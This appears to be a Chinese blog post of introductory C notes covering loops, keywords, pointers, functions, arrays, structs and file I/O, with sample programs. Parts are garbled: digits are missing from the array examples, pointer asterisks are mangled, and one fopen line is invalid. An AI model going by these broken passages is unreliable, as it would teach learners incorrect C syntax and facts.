<p>C语言循环控制语句提供了 while语句、do-while语句和for语句来实现循环结构。<br>　　<strong>while循环语句</strong><br>　　一般形式如下：<br>　　while（表达式）<br>　　语句<br>　　<strong>do-while语句</strong><br>　　一般形式如下：<br>　　do语句while（表达式）；<br>　　do-while循环是先执行语句，然后对表达式求值。若值为真，则再次执行语句，如此反复执行，否则将结束循环。语句可以是简单语句，也可以是复合语句。<br>　　<strong>for语句</strong><br>　　for语句是循环控制结构中使用最广泛的一种循环控制语句，特别适合已知循环次数的情况。<br>　　一般形式如下：<br>　　for ( [表达式 1]; [表达式 2 ]; [表达式3] )语句<br>　　其中：<br>　　表达式1：一般为赋值表达式，给控制变量赋初值；<br>　　表达式2：关系表达式或逻辑表达式，循环控制条件；<br>　　表达式3：一般为赋值表达式，给控制变量增量或减量；<br>　　语句：循环体，当有多条语句时，必须使用复合语句。<br>　　其执行过程如下：首先计算表达式1，然后计算表达式 2。若表达式2为真，则执行循环体；否则，退出 for循环，执行for循环后的语句。如果执行了循环体，则循环体每执行一次，都计算表达式3，然后重新计算表达式2，依此循环，直至表达式 2的值为假，退出循环。<br>　　for语句的三个表达式都是可以省略的，但分号“;”绝对不能省略。for语句有以下几种格式：<br>　　（1）for(; ;) 语句;<br>　　（2）for(;表达式2;表达式3 ) 语句;<br>　　（3）for(表达式1;表达式2;) 语句;<br>　　（4）for(i=1,j = n; i &lt; j; i ++,j - - ) 语句;<br>　　<strong>三种语句比较</strong><br>　　同一个问题，往往既可以用 while语句解决，也可以用 do-while或者for语句来解决，但在实际应用中，应根据具体情况来选用不同的循环语句。选用的一般原则是：<br>　　(1) 如果循环次数在执行循环体之前就已确定，一般用 for语句。如果循环次数是由循环体的执行情况确定的，一般用 while语句或者do- while语句。<br>　　(2) 当循环体至少执行一次时，用 do-while语句，反之，如果循环体可能一次也不执行，则选用while语句。<br>　　C++/C循环语句中，for语句使用频率最高，while语句其次，do语句很少用。<br>　　三种循环语句for、while、do-while可以互相嵌套自由组合。但要注意的是，各循环必须完整，相互之间绝不允许交叉。<br>　　<strong>其他循环语句</strong><br>　　<strong>多重循环结构</strong><br>　　在多重循环中，如果有可能，应当将最长的循环放在最内层，最短的循环放在最外层，以减少CPU跨越循环层的次数。<br>　　一个循环体内又包含另一个完整的循环结构<br>　　三种循环可互相嵌套,层数不限<br>　　外层循环可包含两个以上内循环,但不能相互交叉</p>
</blockquote>
<p><img src="https://i.loli.net/2021/05/22/eHgQPjWEq4f5rty.png" alt="image-20210522102212026"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">　c语言32个关键字</span><br><span class="line">auto ：声明自动变量 一般不使用  </span><br><span class="line">　　double ：声明双精度变量或函数  </span><br><span class="line">　　int： 声明整型变量或函数  </span><br><span class="line">　　struct：声明结构体变量或函数  </span><br><span class="line">　　break：跳出当前循环  </span><br><span class="line">　　else ：条件语句否定分支（与 if 连用）  </span><br><span class="line">　　long ：声明长整型变量或函数      </span><br><span class="line">　　switch :用于开关语句   </span><br><span class="line">　　case：开关语句分支    </span><br><span class="line">　　enum ：声明枚举类型     </span><br><span class="line">　　register：声明积存器变量   </span><br><span class="line">　　typedef：用以给数据类型取别名（当然还有其他作用）  </span><br><span class="line">　　char ：声明字符型变量或函数  </span><br><span class="line">　　extern：声明变量是在其他文件正声明（也可以看做是引用变量）  </span><br><span class="line">　　return ：子程序返回语句（可以带参数，也看不带参数）    </span><br><span class="line">　　union：声明联合数据类型    </span><br><span class="line">　　const ：声明只读变量    </span><br><span class="line">　　float：声明浮点型变量或函数  </span><br><span class="line">　　short ：声明短整型变量或函数  </span><br><span class="line">　　unsigned：声明无符号类型变量或函数  </span><br><span class="line">　　continue：结束当前循环，开始下一轮循环   </span><br><span class="line">　　for：一种循环语句(可意会不可言传）        </span><br><span class="line">　　signed：生命有符号类型变量或函数    </span><br><span class="line">　　void ：声明函数无返回值或无参数，声明无类型指针（基本上就这三个作用）  </span><br><span class="line">　　default：开关语句中的“其他”分支   </span><br><span class="line">　　goto：无条件跳转语句      </span><br><span class="line">　　sizeof：计算数据类型长度    </span><br><span class="line">　　volatile：说明变量在程序执行中可被隐含地改变   </span><br><span class="line">　　do ：循环语句的循环体  </span><br><span class="line">　　while ：循环语句的循环条件  </span><br><span class="line">　　static ：声明静态变量</span><br></pre></td></tr></table></figure></div>

<h1 id="指针"><a href="#指针" class="headerlink" title="指针"></a>指针</h1><blockquote>
<p><strong>1．定义方法</strong><br>　　形式：<br>　　类型标识符<em>变量标识符；<br>　　定义存放指定类型数据地址的指针变量。<br>　　类型标识符是定义指针的基类型，给出指针数据对应存储单元所存放的数据的类型，一般用“指向”这个词来说明这种关系，即类型标识符给出指针所指向的数据类型，可以是简单类型，也可以是复杂类型。用“</em>”表示定义的是指针变量，不是普通变量。变量标识符给出的是指针变量名。<br>　　例如：<br>　　(1)Int <em>p1，</em>p2，<em>p3；<br>　　定义指向整型数据的指针变量p1、p2、p3。<br>　　(2)float *q1，</em>q2，<em>q3；<br>　　定义指向实型数据的指针变量q1、q2、q3。<br>　　(3)char</em>r1，<em>r2，</em>r3；<br>　　定义指向字符型数据的指针变量r1、r2、r3。<br>　　(4)struct date<br>　　{int year；<br>　　int month；<br>　　int day;<br>　　}*t1， *t2， *t3；<br>　　定义指向struct date类型数据的指针变量t1、t2、t3。</p>
</blockquote>
<blockquote>
<p><strong>2．指针变量所指向的变量特定类型的数据</strong><br>　　定义的指针变量用于存放指向类型数据的地址，我们可以通过指针运算“<em>”，引用指针变量所指向的数据。有关内容我们在指针运算中加以介绍。<br>　　例如，对指针变量p1、p2、p3，假定已有值，\</em>p1、<em>p2、</em>p3代表指针变量p1、p2、p3所指向的数据，也就是p1、p2、p3的值对应的存储单元里存放的数据，称为指针变量所指向的变量，简称指针指向变量。<br>　　指针类型也是一种复杂类型，指针指向变量可以认为是指针数据的分量。指针指向变量相当于基类型变量。<br>　　如果指针变量p1、p2、p3分别存放整型变量i、j、k的地址，则p1指向i，p2指向j，p3指向k。</p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a=<span class="number">100</span>,b=<span class="number">10</span>;     <span class="comment">//定义整型变量a,b,并初始化</span></span><br><span class="line">	<span class="keyword">int</span> * pointer_1,* pointer_2;  <span class="comment">//定义指向整型数据的指针变量pointer_1,pointer_2</span></span><br><span class="line">	pointer_1=&amp;a;   <span class="comment">//把变量a的地址赋给指针变量pointer_1</span></span><br><span class="line">	pointer_2=&amp;b;    <span class="comment">//把变量b的地址赋给指针变量pointer_2</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"a=%d,b=%d\n"</span>,a,b);  <span class="comment">//输出变量a和b的值</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"* pointer_1=%d,* pointer_2=%d\n"</span>,* pointer_1,* pointer_2);  <span class="comment">//输出变量a和b的值</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><img src="https://i.loli.net/2021/05/22/TgmJXiQSCtxOdoF.png" alt="image-20210522103052215"></p>
<h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><blockquote>
<p>　一、无参函数的定义形式<br>　　类型标识符 函数名()<br>　　 {<br>　　 声明部分<br>　　 语句<br>　　 }<br>　　其中类型标识符和函数名称为函数头。类型标识符指明了本函数的类型，函数的类型实际上是函数返回值的类型。该类型标识符与前面介绍的各种说明符相同。函数名是由用户定义的标识符，函数名后有一个空括号，其中无参数，但括号不可少。<br>　　{}中的内容称为函数体。在函数体中声明部分，是对函数体内部所用到的变量的类型说明。<br>　　在很多情况下都不要求无参函数有返回值，此时函数类型符可以写为void。<br>　　我们可以改写一个函数定义：<br>　　 void Hello()<br>　　 {<br>　　 printf (“Hello,world \n”);<br>　　 }<br>　　这里，只把main改为Hello作为函数名，其余不变。Hello函数是一个无参函数，当被其它函数调用时，输出Hello world字符串。<br>　　二、有参函数定义的一般形式<br>　　类型标识符 函数名(形式参数表列)<br>　　 {<br>　　 声明部分<br>　　 语句<br>　　 }<br>　　有参函数比无参函数多了一个内容，即形式参数表列。在形参表中给出的参数称为形式参数，它们可以是各种类型的变量，各参数之间用逗号间隔。在进行函数调用时，主调函数将赋予这些形式参数实际的值。形参既然是变量，必须在形参表中给出形参的类型说明。<br>　　例如，定义一个函数，用于求两个数中的大数，可写为：<br>　　 int max(int a, int b)<br>　　 {<br>　　 if (a&gt;b) return a;<br>　　 else return b;<br>　　 }<br>　　第一行说明max函数是一个整型函数，其返回的函数值是一个整数。形参为a,b,均为整型量。a,b的具体值是由主调函数在调用时传送过来的。在{}中的函数体内，除形参外没有使用其它变量，因此只有语句而没有声明部分。在max函数体中的return语句是把a(或b)的值作为函数的值返回给主调函数。有返回值函数中至少应有一个return语句。<br>　　在Ｃ程序中，一个函数的定义可以放在任意位置，既可放在主函数main之前，也可放在main之后。</p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">print_star</span><span class="params">()</span></span>;        <span class="comment">//声明print_star 函数</span></span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">print_message</span><span class="params">()</span></span>;     <span class="comment">//声明print_message函数</span></span><br><span class="line">	print_star();             <span class="comment">//调用print_star 函数</span></span><br><span class="line">	print_message();          <span class="comment">//调用print_message函数</span></span><br><span class="line">	print_star();             <span class="comment">//调用print_star 函数</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_star</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"*************\n"</span>);  <span class="comment">//输出一行*号</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_message</span><span class="params">()</span>         <span class="comment">//定义print_message函数</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"How do you do!\n"</span>); <span class="comment">//输出一行文字信息</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h1><blockquote>
<p><strong>1、数组的概念、定义和使用</strong><br>　　数组（array）是C语言中用于组合同类型数据对象的机制。一个数组里汇集一批对象（数组元素）。程序中既能从数组出发处理其中的个别元素，也能以统一方式处理数组的一批元素或所有元素。后一处理方式特别重要，是由一批成员构成的数组和一批独立命名的变量间的主要区别。数组机制要解决三个问题：）描述数组的性质，定义数组变量； ）使用数组，包括通过数组变量使用元素； ）实现数组，即在内存里为数组安排一种存储方式，使程序里可以方便地操作它们。当然，最后一个问题主要与语言的实现有关系，在实现C语言系统时，必须确定如何实现数组变量。了解这方面情况也有利于在编程时正确使用数组。<br>　　<strong>2、数组变量定义</strong><br>　　根据数组的性质，在定义数组变量（下面简单说成 “定义数组”）需要说明两个问题： ）该数组（变量）的元素是什么类型的； ）这个数组里包含多少个元素。C语言规定，每个数组变量的大小是固定的，需要在定义时说明。数组定义的形式与简单变量类似，但需要增加有关元素个数的信息。在被定义变量名之后写一对方括号就是一个数组定义，指定元素个数的方式是在括号里写一个整型表达式。人们常把数组元素类型看作数组的类型，把元素类型为整型的数组说成是整型数组，类似地说双精度数组等。</p>
</blockquote>
<blockquote>
<p>例如，下面的描述定义了两个数组：<br>　　int a[ 0];<br>　　double a [ 00];<br>　　定义了一个包含有 0个元素的整型数组a和一个 00个元素的双精度数组a 。数组元素个数也称为数组的大小或数组的长度。数组定义可以与其他变量的定义写在一起，例如可以写：<br>　　int a [ ], n, a [ ], m;<br>　　数组变量也是变量，数组定义可以出现在任何能定义简单变量的地方。数组变量也是变量，在作用域和存在期方面与简单变量没有差别。根据定义位置不同，数组也分为外部数组和函数内的局部数组，包括函数内的静态数组（用关键字static）和普通的自动数组，定义方式（及位置）决定了它们的作用域与存在期。<br>　　可以写出数组的外部说明。C语言规定，在写数组变量的外部说明时不必写数组大小，只要在数组变量名后写一对方括号。例如下面是两个数组的外部说明：<br>　　extern int a[];<br>　　extern double a [];<br>　　这两个说明通知本源文件的其他部分，有两个数组（a和a ）在其他地方定义，它们的元素类型分别是整型和双精度类型。数组元素个数必须能在编译时静态确定，因此这个表达式必须能静态求值，最简单的情况就是写一个整型字面量（整数）。根据这个规定，下面数组定义不合法<br>　　void f(int m, int n) {<br>　　int b[n];<br>　　….<br>　　}<br>　　此时局部数组b的大小依赖于函数的参数值，这个值在编译时无法确定。<br>　　<strong>3、数组的使用</strong><br>　　使用数组的最基本操作是元素访问，对数组的使用最终都通过对元素的使用而实现。数组元素在数组里顺序排列编号，首元素的编号规定为0，其他元素顺序编号。这样，n个元素的数组的元素编号范围是0到n-1 。如果程序里定义了数组：<br>　　int b[ ];<br>　　b的元素将依次编号为0、 、 、 。数组元素的编号也称为元素的下标或指标。<br>　　数组元素访问通过数组名和表示下标的表达式进行，用下标运算符[]描述。下标运算符[]是C语言里优先级最高的运算符之一，它的两个运算对象的书写形式比较特殊：一个运算对象写在方括号前面，应表示一个数组（简单情况是数组名）；另一个应该是整型表达式，写在括号里面表示元素下标。元素访问是一种基本表达式，写在表达式里的b[ ]就是一个下标表达式，表示访问数组b中编号为 的元素，即上面定义的数组b的最后元素</p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	 <span class="keyword">int</span> a[<span class="number">2</span>][<span class="number">3</span>]=&#123;&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;,</span><br><span class="line">				&#123;<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>&#125;&#125;;</span><br><span class="line">	 <span class="keyword">int</span> b[<span class="number">3</span>][<span class="number">2</span>],i,j;</span><br><span class="line">	 <span class="built_in">printf</span>(<span class="string">"array a:\n"</span>);</span><br><span class="line">	 <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;=<span class="number">1</span>;i++)  <span class="comment">//处理a数组中的一行中各元素</span></span><br><span class="line">	 &#123;</span><br><span class="line">		<span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;=<span class="number">2</span>;j++)<span class="comment">//处理a数组中的某一列元素</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"%5d"</span>,a[i][j]); <span class="comment">//输出a数组各元素</span></span><br><span class="line">			b[j][i]=a[i][j];       <span class="comment">//将a数组元素的值赋值给b数组相应元素</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">printf</span> (<span class="string">"\n"</span>);</span><br><span class="line">	 &#125;</span><br><span class="line">	 <span class="built_in">printf</span> (<span class="string">"array b:\n"</span>);      <span class="comment">//输出b数组各元素</span></span><br><span class="line">	 <span class="keyword">for</span>(<span class="keyword">int</span> n=<span class="number">0</span>; n&lt;=<span class="number">2</span>; n++)</span><br><span class="line">	 &#123;	</span><br><span class="line">		 <span class="keyword">for</span>(<span class="keyword">int</span> m=<span class="number">0</span>;m&lt;=<span class="number">1</span>;m++)</span><br><span class="line">			 <span class="built_in">printf</span>(<span class="string">"%5d"</span>,b[n][m]);</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">	 &#125;</span><br><span class="line">	 <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><img src="https://i.loli.net/2021/05/22/qIYZpFL3SNxt5j7.png" alt="image-20210522105044266"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i,j,row=<span class="number">0</span>,column=<span class="number">0</span>,<span class="built_in">max</span>;</span><br><span class="line">	<span class="keyword">int</span> a[<span class="number">3</span>][<span class="number">4</span>]=&#123;&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;,&#123;<span class="number">9</span>,<span class="number">8</span>,<span class="number">7</span>,<span class="number">6</span>&#125;,&#123;<span class="number">-10</span>,<span class="number">10</span>,<span class="number">-5</span>,<span class="number">2</span>&#125;&#125;; <span class="comment">//定义数组并赋初值</span></span><br><span class="line">	 <span class="built_in">max</span>=a[<span class="number">0</span>][<span class="number">0</span>];       </span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;=<span class="number">2</span>;i++)</span><br><span class="line">	&#123;	 </span><br><span class="line">		<span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;=<span class="number">3</span>;j++)</span><br><span class="line">			<span class="keyword">if</span>(a[i][j]&gt;<span class="built_in">max</span>)</span><br><span class="line">			&#123;	</span><br><span class="line">				<span class="built_in">max</span>=a[i][j];</span><br><span class="line">				row=i;</span><br><span class="line">				column=j;</span><br><span class="line">			&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	 </span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">" max=%d\n row=%d\n column=%d\n"</span>,<span class="built_in">max</span>,row,column);</span><br><span class="line">	 <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><img src="https://i.loli.net/2021/05/22/IyU7upNCPTe9hFz.png" alt="image-20210522105856972"></p>
<h1 id="用户自己建立数据类型"><a href="#用户自己建立数据类型" class="headerlink" title="用户自己建立数据类型"></a>用户自己建立数据类型</h1><blockquote>
<p>　<strong>结构(struct)</strong><br>　　结构是由基本数据类型构成的、并用一个标识符来命名的各种变量的组合。<br>　　结构中可以使用不同的数据类型。<br>　　<strong>1.结构说明和结构变量定义</strong><br>　　在Turbo C中,结构也是一种数据类型,可以使用结构变量,因此,象其它类型的变量一样,在使用结构变量时要先对其定义。<br>　　定义结构变量的一般格式为:<br>　　struct 结构名<br>　　{<br>　　类型 变量名;<br>　　类型 变量名;<br>　　…<br>　　} 结构变量;<br>　　结构名是结构的标识符不是变量名。类型为第二节中所讲述的五种数据类型(整型、浮点型、字符型、指针型和无值型)。构成结构的每一个类型变量称为结构成员,它象数组的元素一样,但数组中元素是以下标来访问的,而结构是按变量名字来访问成员的。<br>　　下面举一个例子来说明怎样定义结构变量。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">struct string</span><br><span class="line">&#123;</span><br><span class="line">char name[8];</span><br><span class="line">int age;</span><br><span class="line">char sex[2];</span><br><span class="line">char depart[20];</span><br><span class="line">float wage1, wage2, wage3, wage4, wage5;</span><br><span class="line">&#125; person;</span><br></pre></td></tr></table></figure></div>

<p>　　这个例子定义了一个结构名为string的结构变量person, 如果省略变量person, 则变成对结构的说明。用已说明的结构名也可定义结构变量。这样定义时上例变成:</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">struct string</span><br><span class="line">&#123;</span><br><span class="line">char name[8];</span><br><span class="line">int age;</span><br><span class="line">char sex[2];</span><br><span class="line">char depart[20];</span><br><span class="line">float wage1, wage2, wage3, wage4, wage5;</span><br><span class="line">&#125;;</span><br><span class="line">struct string person;</span><br></pre></td></tr></table></figure></div>

<p>　　如果需要定义多个具有相同形式的结构变量时用这种方法比较方便, 它先作结构说明, 再用结构名来定义变量。<br>　　例如:<br>　　struct string Tianyr, Liuqi, …;<br>　　如果省略结构名, 则称之为无名结构, 这种情况常常出现在函数内部, 用这种结构时前面的例子变成:</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">struct</span><br><span class="line">&#123;</span><br><span class="line">char name[8];</span><br><span class="line">int age;</span><br><span class="line">char sex[2];</span><br><span class="line">char depart[20];</span><br><span class="line">float wage1, wage2, wage3, wage4, wage5;</span><br><span class="line">&#125; Tianyr, Liuqi;</span><br></pre></td></tr></table></figure></div>

<p>　　<strong>2.结构变量的使用</strong><br>　　结构是一个新的数据类型, 因此结构变量也可以象其它类型的变量一样赋值、运算,不同的是结构变量以成员作为基本变量。<br>　　结构成员的表示方式为:结构变量.成员名如果将”结构变量.成员名”看成一个整体, 则这个整体的数据类型与结构中该成员的数据类型相同, 这样就可象前面所讲的变量那样使用。</p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">"string.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">"stdio.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="keyword">char</span> name[<span class="number">20</span>];        <span class="comment">//候选人姓名</span></span><br><span class="line">	<span class="keyword">int</span> count;            <span class="comment">//候选人得票数</span></span><br><span class="line">&#125;leader[<span class="number">3</span>]=&#123;<span class="string">"Li"</span>,<span class="number">0</span>,<span class="string">"Zhang"</span>,<span class="number">0</span>,<span class="string">"Sun"</span>,<span class="number">0</span>&#125;;<span class="comment">//定义结构体数组并初始化</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i,j;</span><br><span class="line">	<span class="keyword">char</span> leader_name[<span class="number">20</span>]; <span class="comment">//定义字符数组</span></span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=<span class="number">10</span>;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">"%s"</span>,leader_name); <span class="comment">//输入所选的候选人姓名</span></span><br><span class="line">		<span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">3</span>;j++)</span><br><span class="line">			<span class="keyword">if</span>(<span class="built_in">strcmp</span>(leader_name,leader[j].name)==<span class="number">0</span>)</span><br><span class="line">				leader[j].count++;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"\nResult:\n"</span>);</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"%5s:%d\n"</span>,leader[i].name,leader[i].count);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><img src="https://i.loli.net/2021/05/22/X6JNrPflWnDuYjy.png" alt="image-20210522111719997"></p>
<h1 id="文件的输入与输出"><a href="#文件的输入与输出" class="headerlink" title="文件的输入与输出"></a>文件的输入与输出</h1><blockquote>
<p>C语言是通过将一个文件类型指针与文件关联起来来对文件进行打开、关闭、输入、输出。<br>　　文件类型为FILE（实际上是一个结构体）。定义一个文件指针为FILE *fp；就可以将fp和某个文件关联起来进行操作了。例如要打开一个文件：<br>　　FILE *fp;fp=fopen(“filename”，“打开方式”)；//fopen的返回值为NULL或指向文件的指针或者直接FILE *fp=(“filename”,”打开方式”)；如果要重定向只需将指针fp和另一个文件关联。意思是可用一个文件指针操作多个文件。<br>　　文件使用完后要及时关闭。这是个好习惯。关闭函数为fclose(fp);这样fp就不在和之前指向的文件关联了。<br>　　1.判断文件是否打开成功： <a href="http://www.2cto.com" target="_blank" rel="noopener">www.2cto.com</a><br>　　判断文件是否打开成功可用fopen的返回值if((fp=fopen(“filename”,”r”))==NULL)则打开失败。<br>　　2.判断文件是否结束：<br>　　判断ASCII文件是否结束fgetc（）会返回结束标志EOF（即-1）由于二进制文件数据会出现-1所以必须用函数feof(fp)判断，feof(fp)==1则已结束。<br>　　3.单个字符的输入输出：fgetc（）和fputc（）<br>　　ch=fgetc(fp);fp为文件指针，且fgetc()不会忽略空格和回车符，只能用于读入字符。相应的fputc(ch,fp);向文件输出字符时也不会忽略空格，回车符因为fgetc()返回字符所以fgetc()和fputc()通常嵌套使用：fputc（fgetc（in），out）。<br>　　fputc()的返回值为输入的字符或EOF（-1）（失败的情况下）<br>　　fgetc（）的返回值为读入的字符（包括文件结束标志EOF(-1)）<br>　　4.数据块的输入输出：fread（buff,size,count,fp）和发fwrite(buffer,size,count,fp)buffer是一个指针，对于fread，它是读入数据的存放地址，对于发fwrite它是要输出数据的地址，size是指要读写的字节数，count是要进行读写多少个size字节的数据项。<br>　　如果成功fread和fwrite都返回成功输入和读取的数据块个数有可能比count小；<br>　　注意：fread参数buffer指向的空间必须大于或等于要读入的数据块大小。<br>　　fread和fwrite一般用于二进制文件的输入输出。用于ASCII文件字符发生转换的情况下可能出现与原设想的情况不同。<br>　　5.putw（）和getw()用来对磁盘文件读写一个整数。<br>　　例如putw（10，fp）；//返回值为输出的数字（int）<br>　　int i=getw（fp）；//失败则返回-1<br>　　但注意putw（）和getw（）都是按二进制输入输出的。<br>　　所以如果你用putw（）输入数据到文件后以文本的方式打开看到的将都是乱码。<br>　　同样如果你在文本文件中输入了数字并保存，用getw（）来读入的话读入的结果并不是你想象的那样。因为它是按二进制读的</p>
</blockquote>
<blockquote>
<table>
<thead>
<tr>
<th>r</th>
<th>打开一个已有的文本文件，允许读取文件。</th>
</tr>
</thead>
<tbody><tr>
<td>w</td>
<td>打开一个文本文件，允许写入文件。如果文件不存在，则会创建一个新文件。在这里，您的程序会从文件的开头写入内容。如果文件存在，则该会被截断为零长度，重新写入。</td>
</tr>
<tr>
<td>a</td>
<td>打开一个文本文件，以追加模式写入文件。如果文件不存在，则会创建一个新文件。在这里，您的程序会在已有的文件内容中追加内容。</td>
</tr>
<tr>
<td>r+</td>
<td>打开一个文本文件，允许读写文件。</td>
</tr>
<tr>
<td>w+</td>
<td>打开一个文本文件，允许读写文件。如果文件已存在，则文件会被截断为零长度，如果文件不存在，则会创建一个新文件。</td>
</tr>
<tr>
<td>a+</td>
<td>打开一个文本文件，允许读写文件。如果文件不存在，则会创建一个新文件。读取会从文件的开头开始，写入则只能是追加模式。</td>
</tr>
</tbody></table>
</blockquote>
<blockquote>
<p><strong>注意：</strong>请确保您有可用的 <strong>tmp</strong> 目录，如果不存在该目录，则需要在您的计算机上先创建该目录。</p>
<p><strong>/tmp</strong> 一般是 Linux 系统上的临时目录，如果你在 Windows 系统上运行，则需要修改为本地环境中已存在的目录，例如: <strong>C:\tmp</strong>、<strong>D:\tmp</strong>等。</p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   FILE *fp = <span class="literal">NULL</span>;</span><br><span class="line">   </span><br><span class="line">   fp = fopen(<span class="string">"D:\\CC\\test.txt"</span>,<span class="string">"w+"</span>);</span><br><span class="line">   <span class="built_in">fprintf</span>(fp, <span class="string">"this is test fprinttf ……\n"</span>);</span><br><span class="line">   <span class="built_in">fputs</span>(<span class="string">"This is testing fputs……\n"</span>, fp);</span><br><span class="line">   fclose(fp);</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><img src="https://i.loli.net/2021/05/22/HVTaMmDk3Ud65f7.png" alt="image-20210522115234904"></p>
<blockquote>
